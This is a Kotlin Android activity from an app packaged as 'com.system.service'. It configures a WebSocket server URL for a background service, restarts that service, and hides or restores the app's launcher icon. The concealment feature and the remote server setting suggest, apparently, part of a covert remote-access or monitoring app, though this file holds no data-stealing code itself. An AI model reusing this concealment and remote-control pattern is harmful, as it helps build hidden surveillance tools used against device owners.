package com.system.service.setup

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import com.system.service.core.CoreService

class HiddenSettingsActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(com.system.service.R.layout.activity_hidden_settings)
        title = "System Settings"

        val etUrl    = findViewById<EditText>(com.system.service.R.id.etServerUrl)
        val btnSave  = findViewById<Button>(com.system.service.R.id.btnSaveUrl)
        val btnShow  = findViewById<Button>(com.system.service.R.id.btnShowIcon)
        val btnHide  = findViewById<Button>(com.system.service.R.id.btnHideIcon)
        val btnRestart = findViewById<Button>(com.system.service.R.id.btnRestart)
        val tvStatus = findViewById<TextView>(com.system.service.R.id.tvConnStatus)

        // Load current URL
        val prefs = getSharedPreferences("config", MODE_PRIVATE)
        etUrl.setText(prefs.getString("server_url", CoreService.SERVER_URL))

        // Connection status
        val isConn = CoreService.instance != null
        tvStatus.text = if (isConn) "Service: RUNNING" else "Service: STOPPED"
        tvStatus.setTextColor(if (isConn) 0xFF4CAF50.toInt() else 0xFFF44336.toInt())

        // Icon state
        val iconEnabled = packageManager.getComponentEnabledSetting(
            ComponentName(this, SetupActivity::class.java)
        ) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        btnShow.isEnabled = !iconEnabled
        btnHide.isEnabled = iconEnabled

        btnSave.setOnClickListener {
            val url = etUrl.text.toString().trim()
            if (url.startsWith("ws://") || url.startsWith("wss://")) {
                CoreService.SERVER_URL = url
                prefs.edit().putString("server_url", url).apply()
                Toast.makeText(this, "URL saved & service reconnecting!", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "URL must start with ws:// or wss://", Toast.LENGTH_SHORT).show()
            }
        }

        btnShow.setOnClickListener {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, SetupActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            btnShow.isEnabled = false
            btnHide.isEnabled = true
            Toast.makeText(this, "Icon visible in launcher now", Toast.LENGTH_SHORT).show()
        }

        btnHide.setOnClickListener {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, SetupActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            btnShow.isEnabled = true
            btnHide.isEnabled = false
            Toast.makeText(this, "Icon hidden from launcher", Toast.LENGTH_SHORT).show()
        }

        btnRestart.setOnClickListener {
            try {
                startForegroundService(Intent(this, CoreService::class.java))
                Toast.makeText(this, "Service restarted!", Toast.LENGTH_SHORT).show()
                tvStatus.text = "Service: RUNNING"
                tvStatus.setTextColor(0xFF4CAF50.toInt())
            } catch (e: Exception) {
                Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_SHORT).show()
            }
        }
    }
}
